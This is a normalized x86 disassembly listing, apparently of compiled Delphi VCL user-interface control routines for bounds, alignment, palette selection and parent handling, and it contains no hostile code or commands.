mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448e76
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov al 0x1
sub_448e7c
push ebx
mov ebx eax
mov eax ebx
call sub_456618
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_448eb0
push ebx
mov ebx eax
mov eax ebx
call sub_456668
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4043b0
je r-xdata
mov al 0x1
pop ebx
retn
sub_448ee8
push ebx
mov ebx eax
mov eax ebx
call sub_4566a4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_448f1c
push ebx
mov ebx eax
mov eax ebx
call sub_4208b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_448f44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_449fe8
sub_448f64
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_448f84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403ff8
sub_448fa8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_449ed8
sub_448fc8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_448ff4
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4043b0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_449058
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_449934
sub_449078
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_449920
sub_449098
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_4490b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41ffc4
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4232d4
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44a068
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_448bd8
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_44af2c
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_449190
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4035e0
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_469a44
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c8
push edi
xor ecx ecx
mov edx 0xb039
call sub_44b16c
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_449958
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403450
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403254
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403254
mov eax [ edi + 0x68 ]
call sub_403254
mov eax [ edi + 0x64 ]
call sub_408e2c
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420010
test bl bl
jle r-xdata
sub_44925c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_449284
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403450
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44930c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_44960c
sub_44932c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403254
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44bf88
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403450
mov edx ebx
mov eax edi
call sub_420094
mov eax ebx
mov si 0xffd9
call sub_403450
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_4493f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_420424
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44b16c
sub_449488
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4202e0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_449f70
jmp r-xdata
xor edx edx
mov eax esi
call sub_44932c
sub_4494cc
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403450
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_44930c
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403450
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_449574
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_44b6fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44a400
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44960c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_44b16c
mov eax ebx
mov si 0xffd0
call sub_403450
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403450
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_44960c
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_450adc
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_449728
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_44974c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_449774
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_449798
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_4497bc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_4498b7
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403450
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4498be
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41a714
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403450
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403450
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41a474
sub_4498c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44a400
mov edx edi
mov eax ebx
call sub_449978
mov edx edi
mov eax ebx
call sub_44b210
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_449934
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403ff8
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_449978
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4499d4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_449a00
mov edx eax
mov ecx esp
mov eax esi
call sub_419174
mov edx esp
mov eax ebx
call sub_449e44
pop ecx
pop edx
pop esi
pop ebx
retn
sub_449a18
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4499bc
mov ecx esp
mov edx esi
call sub_419174
mov edx esp
mov eax ebx
call sub_449e44
pop ecx
pop edx
pop esi
pop ebx
retn
sub_449a40
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_449ac1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449ac8
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
sub_449ad0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_449afc
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_449b28
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_465f98
sub_449b58
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_44b16c
sub_449bd4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call sub_40651c
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call sub_40651c
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call sub_40651c
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call sub_40651c
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call sub_40651c
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call sub_40651c
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call sub_40651c
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call sub_40651c
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_42372c
push eax
call sub_40651c
mov edx eax
mov eax ebx
call sub_423748
sub_449da0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_449e36
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_42051c
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_449fb8
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4043b0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449e3d
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_449fe8
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_449e44
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_449e8c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
test esi esi
je r-xdata
mov edx ebx
call sub_44d418
mov edx ebx
mov eax esi
call sub_44d344
mov eax ebx
call sub_44960c
sub_449ed8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403450
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_44b16c
mov eax edi
mov si 0xffd0
call sub_403450
sub_449f70
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_45e2b4
mov edx ebx
mov eax esi
call sub_420094
sub_449f94
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_44b16c
pop ebx
retn
sub_449fb8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_449f2c
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404094
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_449f3c
sub_449fe8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44a03d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449fb8
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4043b0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
